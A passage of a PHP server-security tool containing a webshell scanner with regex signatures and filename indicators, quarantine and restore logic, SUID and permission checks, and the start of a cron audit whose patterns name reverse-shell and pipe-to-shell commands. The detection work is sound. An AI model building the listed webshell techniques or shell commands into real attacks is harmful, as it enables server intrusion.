    $lines = array('=== DNS LOOKUP: ' . $host . ' ===', '');
    if ($type === 'ALL') {
        foreach ($map as $label => $const) {
            $recs = @dns_get_record($host, $const);
            if (!empty($recs)) {
                $lines[] = '--- ' . $label . ' ---';
                foreach ($recs as $r) {
                    $lines[] = json_encode($r, JSON_UNESCAPED_UNICODE | JSON_UNESCAPED_SLASHES);
                }
                $lines[] = '';
            }
        }
    } else {
        if (!isset($map[$type])) return array('ok' => false, 'error' => 'Invalid record type');
        $recs = @dns_get_record($host, $map[$type]);
        if (empty($recs)) {
            $lines[] = '(no ' . $type . ' records)';
        } else {
            foreach ($recs as $r) {
                $lines[] = json_encode($r, JSON_UNESCAPED_UNICODE | JSON_UNESCAPED_SLASHES);
            }
        }
    }
    if (count($lines) <= 2) $lines[] = '(no records found)';
    return array('ok' => true, 'output' => implode("\n", $lines));
}

function secSuidFind($baseDir)
{
    $isWin = strtoupper(substr(PHP_OS, 0, 3)) === 'WIN';
    if ($isWin) {
        return array('ok' => true, 'output' => "=== SUID/SGID SCAN ===\nLinux/Unix only.\n");
    }
    $suid = runTerminal('find /usr /bin /sbin /home /opt /tmp /var -perm -4000 -type f 2>/dev/null | head -80', $baseDir);
    $sgid = runTerminal('find /usr /bin /sbin /home /opt /tmp /var -perm -2000 -type f 2>/dev/null | head -40', $baseDir);
    $cap = runTerminal('getcap -r /usr /bin /sbin 2>/dev/null | head -40', $baseDir);
    $out = "=== SUID BINARIES (setuid) ===\n" . trim($suid['output']) . "\n\n";
    $out .= "=== SGID BINARIES (setgid) ===\n" . trim($sgid['output']) . "\n\n";
    $out .= "=== CAPABILITIES ===\n" . trim($cap['output']);
    return array('ok' => true, 'output' => $out);
}

function btGetScanRoots($baseDir, $scanPath)
{
    $roots = array();
    if ($scanPath !== '') {
        $resolved = resolvePath($baseDir, $scanPath, false);
        if ($resolved && @is_dir($resolved)) $roots[] = $resolved;
    }
    if (empty($roots)) {
        $roots[] = $baseDir;
        $docRoot = isset($_SERVER['DOCUMENT_ROOT']) ? $_SERVER['DOCUMENT_ROOT'] : '';
        if ($docRoot && @is_dir($docRoot)) $roots[] = $docRoot;
        foreach (array('/var/www', '/home', '/tmp', '/var/tmp', '/opt', '/srv', '/usr/local') as $r) {
            if (@is_dir($r) && !in_array($r, $roots, true)) $roots[] = $r;
        }
    }
    return array_values(array_unique($roots));
}

function btWebshellSignatures($aggressive)
{
    $sigs = array(
        array('pattern' => '/eval\s*\(\s*base64_decode/is', 'score' => 45, 'name' => 'eval(base64_decode())'),
        array('pattern' => '/eval\s*\(\s*gz(inflate|uncompress|decode)/is', 'score' => 45, 'name' => 'eval(gz*)'),
        array('pattern' => '/eval\s*\(\s*str_rot13/is', 'score' => 40, 'name' => 'eval(str_rot13())'),
        array('pattern' => '/eval\s*\(\s*gzuncompress/is', 'score' => 45, 'name' => 'eval(gzuncompress)'),
        array('pattern' => '/assert\s*\(\s*\$_(GET|POST|REQUEST|COOKIE)/is', 'score' => 45, 'name' => 'assert($_INPUT)'),
        array('pattern' => '/preg_replace\s*\([^)]*\/e["\']/is', 'score' => 45, 'name' => 'preg_replace /e'),
        array('pattern' => '/create_function\s*\(/is', 'score' => 35, 'name' => 'create_function()'),
        array('pattern' => '/(shell_exec|system|passthru|proc_open|popen|pcntl_exec)\s*\([^)]*\$_(GET|POST|REQUEST)/is', 'score' => 40, 'name' => 'cmd_exec($_INPUT)'),
        array('pattern' => '/@eval\s*\(/is', 'score' => 35, 'name' => '@eval()'),
        array('pattern' => '/gzinflate\s*\(\s*base64_decode/is', 'score' => 40, 'name' => 'gzinflate(base64)'),
        array('pattern' => '/base64_decode\s*\(\s*[\'"][A-Za-z0-9+\/=]{80,}/is', 'score' => 25, 'name' => 'long base64 blob'),
        array('pattern' => '/\$_(GET|POST|REQUEST|COOKIE)\s*\[[^\]]+\]\s*\(/is', 'score' => 30, 'name' => 'variable func call $_INPUT'),
        array('pattern' => '/(FilesMan|c99shell|r57shell|WSO\s|b374k|alfa\s*shell|AnonymousFox|IndoXploit|Gecko\s*Shell|mini\s*shell)/is', 'score' => 50, 'name' => 'known webshell brand'),
        array('pattern' => '/move_uploaded_file\s*\([^)]+\)\s*;[\s\S]{0,200}(eval|assert)/is', 'score' => 35, 'name' => 'upload+eval'),
        array('pattern' => '/\\$\{\s*[\'"]\\\\x/is', 'score' => 30, 'name' => 'hex var obfuscation'),
        array('pattern' => '/(passthru|shell_exec|system|exec)\s*\(\s*\$_(GET|POST|REQUEST)/is', 'score' => 40, 'name' => 'direct webshell cmd'),
        array('pattern' => '/php:\/\/input/is', 'score' => 15, 'name' => 'php://input wrapper'),
        array('pattern' => '/(cmd|command|exec|shell|backdoor)\s*[\'"]?\s*=>\s*\$_(GET|POST|REQUEST)/is', 'score' => 30, 'name' => 'cmd parameter handler'),
        array('pattern' => '/chr\s*\(\s*\d+\s*\)\s*\.\s*chr/is', 'score' => 20, 'name' => 'chr() obfuscation chain'),
        array('pattern' => '/\\$[a-zA-Z_\x7f-\xff]{1,8}\s*=\s*[\'"][a-zA-Z0-9+\/=]{100,}[\'"]/is', 'score' => 15, 'name' => 'suspicious encoded string'),
        array('pattern' => '/\\$_(GET|POST|REQUEST|COOKIE)\s*\[[^\]]+\]\s*\(\s*\$_(GET|POST|REQUEST)/is', 'score' => 35, 'name' => 'double $_INPUT invoke'),
        array('pattern' => '/(include|require)(_once)?\s*\(\s*\$_(GET|POST|REQUEST)/is', 'score' => 35, 'name' => 'dynamic include $_INPUT'),
        array('pattern' => '/file_put_contents\s*\([^,]+,\s*\$_(POST|REQUEST)/is', 'score' => 30, 'name' => 'file_put from POST'),
        array('pattern' => '/\\$[a-z_]+\s*=\s*str_replace\s*\([^)]+\)\s*;\s*eval/is', 'score' => 35, 'name' => 'str_replace+eval'),
        array('pattern' => '/call_user_func\s*\(\s*[\'"]assert[\'"]/is', 'score' => 35, 'name' => 'call_user_func assert'),
        array('pattern' => '/ReflectionFunction\s*\(/is', 'score' => 20, 'name' => 'ReflectionFunction'),
        array('pattern' => '/\\$_(SERVER|FILES)\s*\[[^\]]+\]\s*\(/is', 'score' => 25, 'name' => '$_SERVER/FILES invoke'),
        array('pattern' => '/`[^`]*\$_(GET|POST|REQUEST)/is', 'score' => 35, 'name' => 'backtick cmd $_INPUT'),
        array('pattern' => '/\\$[a-zA-Z0-9_]+\s*=\s*\\$[a-zA-Z0-9_]+\s*\(\s*\\$[a-zA-Z0-9_]+\s*\)\s*;\s*\\$[a-zA-Z0-9_]+\s*\(/is', 'score' => 20, 'name' => 'variable function chain'),
        array('pattern' => '/(cmd\.exe|\/bin\/sh|\/bin\/bash).*\\$_(GET|POST|REQUEST)/is', 'score' => 35, 'name' => 'shell binary + input'),
        array('pattern' => '/\\$[a-zA-Z0-9_]{1,3}\s*=\s*[\'"]\\x[0-9a-f]{2}/is', 'score' => 18, 'name' => 'hex byte construction'),
        array('pattern' => '/\\$GLOBALS\s*\[[^\]]+\]\s*\(/is', 'score' => 22, 'name' => '$GLOBALS func call'),
        array('pattern' => '/(WSO|uploader|FilesMan|Mini Shell|Bypass|Safe0ver|Locus7s)/is', 'score' => 40, 'name' => 'webshell keyword'),
        array('pattern' => '/\\$_(GET|POST|REQUEST)\s*\[[\'"]pass[\'"]\]/is', 'score' => 18, 'name' => 'password gate $_INPUT'),
        array('pattern' => '/fsockopen\s*\([^)]+\$_(GET|POST|REQUEST)/is', 'score' => 30, 'name' => 'fsockopen backconnect'),
        array('pattern' => '/stream_socket_client\s*\(/is', 'score' => 12, 'name' => 'stream_socket_client'),
        array('pattern' => '/\\$[a-zA-Z0-9_]+\s*=\s*\\$\{[^}]+\}/is', 'score' => 18, 'name' => 'variable variables'),
    );
    if ($aggressive) {
        $sigs = array_merge($sigs, array(
            array('pattern' => '/<\?php/is', 'score' => 8, 'name' => 'php open tag'),
            array('pattern' => '/\\$_(GET|POST|REQUEST|COOKIE)\s*\[/is', 'score' => 8, 'name' => 'superglobal input access'),
            array('pattern' => '/(shell_exec|system|passthru|exec|popen|proc_open)\s*\(/is', 'score' => 12, 'name' => 'dangerous function'),
            array('pattern' => '/base64_decode\s*\(/is', 'score' => 10, 'name' => 'base64_decode()'),
            array('pattern' => '/(eval|assert)\s*\(/is', 'score' => 15, 'name' => 'eval/assert call'),
            array('pattern' => '/\\$_(GET|POST|REQUEST)\s*\[[\'"]cmd[\'"]\]/is', 'score' => 25, 'name' => 'cmd parameter'),
            array('pattern' => '/\\$_(GET|POST|REQUEST)\s*\[[\'"]0[\'"]\]/is', 'score' => 20, 'name' => 'array index 0 input'),
            array('pattern' => '/auto_prepend_file|auto_append_file/is', 'score' => 30, 'name' => 'auto_prepend injection'),
            array('pattern' => '/AddHandler\s+application\/x-httpd-php/is', 'score' => 25, 'name' => 'htaccess php handler abuse'),
            array('pattern' => '/\\$_(GET|POST|REQUEST)\s*\[[\'"]z[0-9]?[\'"]\]/is', 'score' => 22, 'name' => 'obfuscated param z*'),
            array('pattern' => '/pack\s*\(\s*[\'"]H\*[\'"]/is', 'score' => 15, 'name' => 'pack hex decode'),
            array('pattern' => '/strrev\s*\(\s*base64_decode/is', 'score' => 28, 'name' => 'strrev+base64'),
            array('pattern' => '/rawurldecode\s*\(\s*base64_decode/is', 'score' => 25, 'name' => 'urldecode+base64'),
            array('pattern' => '/\\$[a-zA-Z0-9_]+\(\$\{?\\$_(GET|POST|REQUEST)/is', 'score' => 30, 'name' => 'func variable from input'),
        ));
    }
    return $sigs;
}

function btFilenameIOCs($aggressive)
{
    $iocs = array(
        'c99.php' => 55, 'r57.php' => 55, 'wso.php' => 55, 'wso2.php' => 55, 'wso1337.php' => 55,
        'shell.php' => 40, 'cmd.php' => 40, 'backdoor.php' => 55, 'b374k.php' => 55, 'b374.php' => 50,
        'alfa.php' => 50, 'alf.php' => 45, 'mini.php' => 25, 'uploader.php' => 30, 'upload.php' => 20,
        'x.php' => 25, 'xx.php' => 25, '0.php' => 30, '1.php' => 25, '2.php' => 22,
        'indoxploit.php' => 55, 'fox.php' => 40, 'leaf.php' => 35, 'marijuana.php' => 50,
        'adminer.php' => 10, '.user.ini' => 25, 'php.ini' => 15,
        'sym403.php' => 45, 'symlink.php' => 40, 'priv8.php' => 45, 'root.php' => 35,
        'hack.php' => 40, 'haxor.php' => 45, '1337.php' => 40, 'locus.php' => 40,
        'c100.php' => 45, 'r00t.php' => 40, 'sh.php' => 35, 'bypass.php' => 35,
        'up.php' => 28, 'upl.php' => 28, 'filemanager.php' => 15, 'fm.php' => 30,
    );
    if ($aggressive) {
        $iocs['test.php'] = 12;
        $iocs['tmp.php'] = 18;
        $iocs['cache.php'] = 15;
        $iocs['log.php'] = 18;
        $iocs['images.php'] = 22;
        $iocs['class.php'] = 12;
        $iocs['config.php.bak'] = 30;
        $iocs['wp-config.php.bak'] = 35;
    }
    return $iocs;
}

function btFilenameHeuristics($basename, &$score, &$hits, $aggressive)
{
    if (preg_match('/^[a-f0-9]{8,}\.(php|phtml|inc|php5)$/i', $basename)) {
        $score += 28;
        $hits[] = 'hex-random filename';
    }
    if (preg_match('/^[a-z0-9]{1,2}\.(php|phtml)$/i', $basename)) {
        $score += 22;
        $hits[] = 'short random php name';
    }
    if (preg_match('/\.(jpg|jpeg|png|gif|ico|css|txt|zip|tar|gz|bmp|webp)\.(php|phtml|php5)$/i', $basename)) {
        $score += 38;
        $hits[] = 'double extension';
    }
    if (preg_match('/(shell|backdoor|hack|exploit|webshell|c99|r57|wso|b374k|cmd|uploader|bypass|priv8|hax|1337|alfa|indoxploit|revshell|payload|trojan|spy|bot|nc\.|netcat|eval|base64|gzinflate|passthru|shell_exec)/i', $basename)) {
        $score += 20;
        $hits[] = 'malware keyword in filename';
    }
    if ($aggressive && preg_match('/^(tmp|temp|cache|log|test|old|bak|backup|dump|upload|upl|img|image|thumb|avatar|icon|css|js|class|module|helper|init|core|loader|config|setup|update|fix|repair|restore|data|info|debug|dev|demo|sample|radio|content|about|theme|plugin|widget|gate|door|key|secret|hidden|stealth|ghost|shadow|priv|root|admin|wp-|xmlrpc|install|lock|radio|content|about)\d*\.(php|phtml|php5|inc)$/i', $basename)) {
        $score += 14;
        $hits[] = 'aggressive suspicious basename';
    }
}

function btSeverityLabel($score)
{
    if ($score >= 50) return 'CRITICAL';
    if ($score >= 30) return 'HIGH';
    if ($score >= 15) return 'MEDIUM';
    return 'LOW';
}

function btScanExtensions()
{
    return array('php', 'phtml', 'php3', 'php4', 'php5', 'php7', 'php8', 'phar', 'inc', 'pht', 'phpt',
        'asp', 'aspx', 'jsp', 'js', 'shtml', 'htaccess', 'cgi', 'pl', 'py', 'sh', 'rb', 'vb', 'vbs');
}

function btAnalyzeFile($path, $signatures, $filenameIOCs, $selfPath, $aggressive)
{
    $realSelf = realpath($selfPath);
    $realPath = @realpath($path);
    if ($realSelf && $realPath && $realSelf === $realPath) return null;

    $score = 0;
    $hits = array();
    $basename = strtolower(basename($path));
    $ext = strtolower(pathinfo($path, PATHINFO_EXTENSION));

    $allowedExt = btScanExtensions();
    if (!in_array($ext, $allowedExt, true) && $basename !== '.htaccess' && $basename !== '.user.ini') {
        if (!$aggressive || !preg_match('/\.(jpg|jpeg|png|gif|bmp|ico|svg|webp|txt|log)$/i', $basename)) {
            return null;
        }
    }

    foreach ($filenameIOCs as $ioc => $pts) {
        if ($basename === strtolower($ioc) || ($aggressive && strpos($basename, strtolower(str_replace('.php', '', $ioc))) !== false && preg_match('/\.(php|phtml|php5|inc|bak)$/i', $basename))) {
            $score += (int)$pts;
            $hits[] = 'filename:' . $ioc;
        }
    }
    btFilenameHeuristics($basename, $score, $hits, $aggressive);

    $size = @filesize($path);
    $maxRead = $aggressive ? 524288 : 98304;
    $maxSize = $aggressive ? 8388608 : 5242880;
    if ($size === false || $size > $maxSize) {
        $minScore = $aggressive ? 10 : 15;
        return ($score >= $minScore) ? array('path' => $path, 'score' => $score, 'severity' => btSeverityLabel($score), 'hits' => $hits, 'size' => $size, 'modified' => @filemtime($path), 'note' => 'not content-scanned (large/unreadable)') : null;
    }

    $content = @file_get_contents($path, false, null, 0, min((int)$size, $maxRead));
    if ($content === false || $content === '') {
        $minScore = $aggressive ? 10 : 15;
        return ($score >= $minScore) ? array('path' => $path, 'score' => $score, 'severity' => btSeverityLabel($score), 'hits' => $hits, 'size' => $size, 'modified' => @filemtime($path)) : null;
    }

    foreach ($signatures as $sig) {
        if (@preg_match($sig['pattern'], $content)) {
            $score += (int)$sig['score'];
            $hits[] = $sig['name'];
        }
    }

    if ($size < 250 && preg_match('/eval|assert|base64_decode|shell_exec|system\s*\(|passthru\s*\(/is', $content)) {
        $score += 28;
        $hits[] = 'tiny file + dangerous func';
    }

    if ($aggressive && preg_match('/<\?(php|=)/i', $content) && preg_match('/\.(jpg|jpeg|png|gif|bmp|ico|svg|webp|txt|css|js)$/i', $basename)) {
        $score += 35;
        $hits[] = 'php tag in non-php extension (polyglot)';
    }

    if ($aggressive && preg_match_all('/[A-Za-z0-9+\/=]{200,}/', $content, $m) && count($m[0]) >= 2) {
        $score += 12;
        $hits[] = 'multiple long encoded blobs';
    }

    $minScore = $aggressive ? 6 : 12;
    if ($score < $minScore) return null;

    return array(
        'path' => $path,
        'score' => $score,
        'severity' => btSeverityLabel($score),
        'hits' => array_values(array_unique($hits)),
        'size' => (int)$size,
        'modified' => @filemtime($path),
    );
}

function btCollectCandidateFiles($roots, $baseDir, $maxFiles, $maxDepth)
{
    $files = array();
    $isWin = strtoupper(substr(PHP_OS, 0, 3)) === 'WIN';
    $exts = btScanExtensions();
    if (!$isWin) {
        $nameParts = array();
        foreach ($exts as $e) {
            $nameParts[] = '-name ' . escapeshellarg('*.' . $e);
        }
        $nameParts[] = '-name ' . escapeshellarg('.htaccess');
        $nameParts[] = '-name ' . escapeshellarg('.user.ini');
        $nameParts[] = '-name ' . escapeshellarg('*.php*');
        $expr = '\( ' . implode(' -o ', $nameParts) . ' \)';
        foreach ($roots as $root) {
            $cmd = 'find ' . escapeshellarg($root) . ' -maxdepth ' . (int)$maxDepth . ' ' . $expr . ' -type f 2>/dev/null | head -' . (int)$maxFiles;
            $out = runTerminal($cmd, $baseDir);
            foreach (explode("\n", $out['output']) as $line) {
                $line = trim($line);
                if ($line !== '' && @is_file($line)) $files[$line] = $line;
            }
            if (count($files) >= $maxFiles) break;
        }
    } else {
        foreach ($roots as $root) {
            btWalkCandidates($root, $exts, $files, 0, $maxDepth, $maxFiles);
            if (count($files) >= $maxFiles) break;
        }
    }
    return array_values($files);
}

function btWalkCandidates($dir, $exts, &$files, $depth, $maxDepth, $maxFiles)
{
    if ($depth > $maxDepth || count($files) >= $maxFiles) return;
    $h = @opendir($dir);
    if (!$h) return;
    while (($name = readdir($h)) !== false) {
        if ($name === '.' || $name === '..') continue;
        $full = $dir . DIRECTORY_SEPARATOR . $name;
        if (@is_file($full)) {
            $ext = strtolower(pathinfo($name, PATHINFO_EXTENSION));
            if (in_array($ext, $exts, true) || $name === '.htaccess' || $name === '.user.ini') {
                $files[$full] = $full;
            }
        } elseif (@is_dir($full) && $depth < $maxDepth) {
            btWalkCandidates($full, $exts, $files, $depth + 1, $maxDepth, $maxFiles);
        }
        if (count($files) >= $maxFiles) break;
    }
    closedir($h);
}

function btFormatFindings($title, $findings, $scanned, $roots)
{
    usort($findings, function ($a, $b) {
        return (int)$b['score'] - (int)$a['score'];
    });
    $lines = array('=== ' . $title . ' ===', 'Roots: ' . implode(', ', $roots), 'Scanned: ' . $scanned . ' files', 'Findings: ' . count($findings), '');
    if (empty($findings)) {
        $lines[] = '(no threats detected in scan scope)';
        return implode("\n", $lines);
    }
    foreach ($findings as $f) {
        $mod = isset($f['modified']) ? date('Y-m-d H:i', $f['modified']) : '-';
        $sz = isset($f['size']) ? secFormatBytes($f['size']) : '-';
        $lines[] = '[' . $f['severity'] . ' score:' . $f['score'] . '] ' . $f['path'];
        $lines[] = '  modified:' . $mod . '  size:' . $sz . '  signals:' . implode(', ', $f['hits']);
        if (isset($f['note'])) $lines[] = '  note:' . $f['note'];
    }
    return implode("\n", $lines);
}

function btWebshellScan($baseDir, $scanPath, $aggressive)
{
    @set_time_limit(600);
    $aggressive = ($aggressive === true || $aggressive === 1 || $aggressive === '1' || $aggressive === 'true');
    $roots = btGetScanRoots($baseDir, $scanPath);
    $signatures = btWebshellSignatures($aggressive);
    $filenameIOCs = btFilenameIOCs($aggressive);
    $maxFiles = $aggressive ? 8000 : 2500;
    $maxFindings = $aggressive ? 500 : 120;
    $maxDepth = $aggressive ? 14 : 9;
    $candidates = btCollectCandidateFiles($roots, $baseDir, $maxFiles, $maxDepth);
    $findings = array();
    foreach ($candidates as $file) {
        $hit = btAnalyzeFile($file, $signatures, $filenameIOCs, __FILE__, $aggressive);
        if ($hit) $findings[] = $hit;
        if (count($findings) >= $maxFindings) break;
    }
    $mode = $aggressive ? 'AGGRESSIVE' : 'STANDARD';
    $out = btFormatFindings('BACKDOOR / WEBSHELL SCAN [' . $mode . ']', $findings, count($candidates), $roots);
    $critical = 0;
    foreach ($findings as $f) {
        if ($f['severity'] === 'CRITICAL' || $f['severity'] === 'HIGH') $critical++;
    }
    return array(
        'ok' => true,
        'output' => $out,
        'count' => count($findings),
        'critical' => $critical,
        'scanned' => count($candidates),
        'findings' => $findings,
        'aggressive' => $aggressive,
    );
}

function btResolveThreatPath($baseDir, $path)
{
    $path = trim((string)$path);
    if ($path === '') return null;
    if (preg_match('/^[A-Za-z]:/', $path) || (strlen($path) > 0 && $path[0] === '/')) {
        $real = @realpath($path);
        return ($real && @is_file($real)) ? $real : null;
    }
    return resolvePath($baseDir, $path);
}

function btQuarantineDir($baseDir)
{
    $tmp = sys_get_temp_dir();
    if (!$tmp) $tmp = $baseDir;
    $dir = rtrim($tmp, DIRECTORY_SEPARATOR) . DIRECTORY_SEPARATOR . 'gecko_quarantine_' . substr(md5($baseDir), 0, 12);
    if (!is_dir($dir)) {
        @mkdir($dir, 0700, true);
    }
    return $dir;
}

function btManifestPath($baseDir)
{
    return btQuarantineDir($baseDir) . DIRECTORY_SEPARATOR . 'manifest.json';
}

function btLoadManifest($baseDir)
{
    $file = btManifestPath($baseDir);
    if (!is_file($file)) return array();
    $raw = @file_get_contents($file);
    if (!$raw) return array();
    $data = json_decode($raw, true);
    if (!is_array($data)) return array();
    $valid = array();
    foreach ($data as $entry) {
        if (!is_array($entry) || empty($entry['id']) || empty($entry['original'])) continue;
        if (!empty($entry['quarantine']) && !is_file($entry['quarantine'])) continue;
        $valid[] = $entry;
    }
    if (count($valid) !== count($data)) {
        btSaveManifest($baseDir, $valid);
    }
    return $valid;
}

function btSaveManifest($baseDir, $entries)
{
    $file = btManifestPath($baseDir);
    @file_put_contents($file, json_encode(array_values($entries), JSON_UNESCAPED_UNICODE | JSON_UNESCAPED_SLASHES | JSON_PRETTY_PRINT));
}

function btListQuarantine($baseDir)
{
    $entries = btLoadManifest($baseDir);
    usort($entries, function ($a, $b) {
        return (int)(isset($b['moved_at']) ? $b['moved_at'] : 0) - (int)(isset($a['moved_at']) ? $a['moved_at'] : 0);
    });
    $dir = btQuarantineDir($baseDir);
    $lines = array('=== QUARANTINE (TMP) ===', 'Location: ' . $dir, 'Items: ' . count($entries), '');
    foreach ($entries as $e) {
        $when = isset($e['moved_at']) ? date('Y-m-d H:i:s', $e['moved_at']) : '-';
        $lines[] = '[' . $e['id'] . '] ' . $e['original'];
        $lines[] = '  quarantined: ' . $when . ' → ' . (isset($e['quarantine']) ? $e['quarantine'] : '-');
    }
    if (empty($entries)) $lines[] = '(empty — no quarantined files)';
    return array(
        'ok' => true,
        'output' => implode("\n", $lines),
        'entries' => $entries,
        'count' => count($entries),
        'dir' => $dir,
    );
}

function btDeleteThreats($baseDir, $paths)
{
    $realSelf = @realpath(__FILE__);
    $quarantined = array();
    $failed = array();
    if (!is_array($paths)) {
        if (is_string($paths) && $paths !== '') $paths = array($paths);
        else $paths = array();
    }
    if (count($paths) > 200) {
        return array('ok' => false, 'error' => 'Max 200 files per batch');
    }
    $qdir = btQuarantineDir($baseDir);
    $manifest = btLoadManifest($baseDir);

    foreach ($paths as $p) {
        $p = trim((string)$p);
        if ($p === '') continue;
        $resolved = btResolveThreatPath($baseDir, $p);
        if (!$resolved) {
            $failed[] = array('path' => $p, 'error' => 'Not found or not a file');
            continue;
        }
        if ($realSelf && $resolved === $realSelf) {
            $failed[] = array('path' => $p, 'error' => 'Protected (scanner itself)');
            continue;
        }
        $id = substr(md5($resolved . microtime(true) . mt_rand()), 0, 16);
        $safeName = preg_replace('/[^a-zA-Z0-9._-]/', '_', basename($resolved));
        $qpath = $qdir . DIRECTORY_SEPARATOR . $id . '_' . $safeName;
        if (!@rename($resolved, $qpath)) {
            if (!@copy($resolved, $qpath)) {
                $failed[] = array('path' => $p, 'error' => 'Move to quarantine failed');
                continue;
            }
            @unlink($resolved);
        }
        $entry = array(
            'id' => $id,
            'original' => $resolved,
            'quarantine' => $qpath,
            'basename' => basename($resolved),
            'moved_at' => time(),
        );
        $manifest[] = $entry;
        $quarantined[] = $entry;
    }
    btSaveManifest($baseDir, $manifest);

    $out = "=== QUARANTINE REPORT (moved to tmp) ===\n";
    $out .= 'Location: ' . $qdir . "\n";
    $out .= 'Quarantined: ' . count($quarantined) . ' · Failed: ' . count($failed) . "\n\n";
    foreach ($quarantined as $q) {
        $out .= '[MOVED] ' . $q['original'] . "\n";
        $out .= '        → ' . $q['quarantine'] . ' (id:' . $q['id'] . ")\n";
    }
    foreach ($failed as $f) {
        $out .= '[FAILED]  ' . $f['path'] . ' — ' . $f['error'] . "\n";
    }
    $out .= "\nFiles can be restored from Quarantine section below.";
    return array(
        'ok' => true,
        'output' => $out,
        'quarantined' => $quarantined,
        'deleted' => array_map(function ($e) { return $e['original']; }, $quarantined),
        'failed' => $failed,
        'count' => count($quarantined),
        'dir' => $qdir,
    );
}

function btRestoreThreats($baseDir, $ids)
{
    if (!is_array($ids)) {
        if (is_string($ids) && $ids !== '') $ids = array($ids);
        else $ids = array();
    }
    if (empty($ids)) {
        return array('ok' => false, 'error' => 'No items selected to restore');
    }
    $manifest = btLoadManifest($baseDir);
    $restored = array();
    $failed = array();
    $remaining = array();
    $idSet = array_flip(array_map('strval', $ids));

    foreach ($manifest as $entry) {
        $eid = (string)$entry['id'];
        if (!isset($idSet[$eid])) {
            $remaining[] = $entry;
            continue;
        }
        $original = isset($entry['original']) ? $entry['original'] : '';
        $qpath = isset($entry['quarantine']) ? $entry['quarantine'] : '';
        if ($original === '' || !is_file($qpath)) {
            $failed[] = array('id' => $eid, 'path' => $original, 'error' => 'Quarantine file missing');
            continue;
        }
        $dest = $original;
        if (is_file($dest)) {
            $dest = dirname($original) . DIRECTORY_SEPARATOR . pathinfo($original, PATHINFO_FILENAME) . '.restored.' . time() . (pathinfo($original, PATHINFO_EXTENSION) ? '.' . pathinfo($original, PATHINFO_EXTENSION) : '');
        }
        $parent = dirname($dest);
        if (!is_dir($parent)) {
            @mkdir($parent, 0755, true);
        }
        if (!@rename($qpath, $dest)) {
            if (!@copy($qpath, $dest)) {
                $failed[] = array('id' => $eid, 'path' => $original, 'error' => 'Restore failed');
                $remaining[] = $entry;
                continue;
            }
            @unlink($qpath);
        }
        $restored[] = array('id' => $eid, 'original' => $original, 'restored_to' => $dest);
    }
    btSaveManifest($baseDir, $remaining);

    $out = "=== RESTORE REPORT ===\n";
    $out .= 'Restored: ' . count($restored) . ' · Failed: ' . count($failed) . "\n\n";
    foreach ($restored as $r) {
        $out .= '[RESTORED] ' . $r['original'];
        if ($r['restored_to'] !== $r['original']) $out .= ' → ' . $r['restored_to'];
        $out .= "\n";
    }
    foreach ($failed as $f) {
        $out .= '[FAILED]   ' . (isset($f['path']) ? $f['path'] : $f['id']) . ' — ' . $f['error'] . "\n";
    }
    return array(
        'ok' => true,
        'output' => $out,
        'restored' => $restored,
        'failed' => $failed,
        'count' => count($restored),
    );
}

function btRecentChanges($baseDir, $scanPath, $days)
{
    $days = max(1, min(90, (int)$days));
    $roots = btGetScanRoots($baseDir, $scanPath);
    $isWin = strtoupper(substr(PHP_OS, 0, 3)) === 'WIN';
    $lines = array('=== RECENTLY MODIFIED WEB FILES (last ' . $days . ' days) ===', '');
    foreach ($roots as $root) {
        if ($isWin) {
            $cmd = 'forfiles /P ' . escapeshellarg($root) . ' /S /D -' . $days . ' /M *.php 2>nul';
        } else {
            $cmd = 'find ' . escapeshellarg($root) . ' -maxdepth 8 -type f \( -name "*.php" -o -name "*.phtml" -o -name "*.js" -o -name ".htaccess" \) -mtime -' . $days . ' -printf "%TY-%Tm-%Td %TH:%TM %s %p\n" 2>/dev/null | sort -r | head -60';
        }
        $out = runTerminal($cmd, $baseDir);
        if (trim($out['output']) !== '') {
            $lines[] = '--- ' . $root . ' ---';
            $lines[] = trim($out['output']);
            $lines[] = '';
        }
    }
    if (count($lines) <= 2) $lines[] = '(no recent changes found)';
    return array('ok' => true, 'output' => implode("\n", $lines));
}

function btWritableScan($baseDir, $scanPath)
{
    $roots = btGetScanRoots($baseDir, $scanPath);
    $isWin = strtoupper(substr(PHP_OS, 0, 3)) === 'WIN';
    $lines = array('=== WORLD-WRITABLE / INSECURE PERMISSIONS ===', '');
    foreach ($roots as $root) {
        if ($isWin) continue;
        $cmd = 'find ' . escapeshellarg($root) . ' -maxdepth 7 -type f \( -perm -0002 -o -perm -0777 \) -ls 2>/dev/null | head -50';
        $out = runTerminal($cmd, $baseDir);
        if (trim($out['output']) !== '') {
            $lines[] = '--- ' . $root . ' ---';
            $lines[] = trim($out['output']);
            $lines[] = '';
        }
        $cmd2 = 'find ' . escapeshellarg($root) . ' -maxdepth 7 -type d -perm -0002 2>/dev/null | head -30';
        $out2 = runTerminal($cmd2, $baseDir);
        if (trim($out2['output']) !== '') {
            $lines[] = 'World-writable directories:';
            $lines[] = trim($out2['output']);
            $lines[] = '';
        }
    }
    if (count($lines) <= 2) $lines[] = $isWin ? '(Linux permission scan only)' : '(no world-writable files found)';
    return array('ok' => true, 'output' => implode("\n", $lines));
}

function btHiddenScan($baseDir, $scanPath)
{
    $roots = btGetScanRoots($baseDir, $scanPath);
    $isWin = strtoupper(substr(PHP_OS, 0, 3)) === 'WIN';
    $lines = array('=== HIDDEN / DOT FILES (executable scripts) ===', '');
    foreach ($roots as $root) {
        if ($isWin) continue;
        $cmd = 'find ' . escapeshellarg($root) . ' -maxdepth 8 -name ".*" -type f \( -name "*.php*" -o -name "*.pl" -o -name "*.sh" -o -name "*.py" -o -name ".htaccess" -o -name ".user.ini" \) -ls 2>/dev/null | head -50';
        $out = runTerminal($cmd, $baseDir);
        if (trim($out['output']) !== '') {
            $lines[] = '--- ' . $root . ' ---';
            $lines[] = trim($out['output']);
            $lines[] = '';
        }
    }
    if (count($lines) <= 2) $lines[] = '(no suspicious hidden scripts found)';
    return array('ok' => true, 'output' => implode("\n", $lines));
}

function btCronAudit($baseDir)
{
    $cron = getCrontab();
    $lines = array('=== CRON PERSISTENCE AUDIT ===', 'Platform: ' . $cron['platform'], '');
    $suspicious = array(
        '/\bcurl\b.*\|\s*(ba)?sh/is', '/\bwget\b.*\|\s*(ba)?sh/is',
        '/\/dev\/tcp\//is', '/\bbash\s+-i/is', '/\bnc\s+-/is',
        '/base64\s+-d/is', '/\beval\b/is', '/\bpython\s+-c/is',
        '/\bperl\s+-e/is', '/\b\/tmp\//is', '/\bchmod\s+\+x/is',
        '/gsocket/is', '/\breverse\b/is', '/\bbackdoor\b/is',
    );
    $content = $cron['content'];
    if (trim($content) === '') {
        $lines[] = '(empty crontab)';
    } else {
        $ln = 0;
        foreach (explode("\n", $content) as $line) {
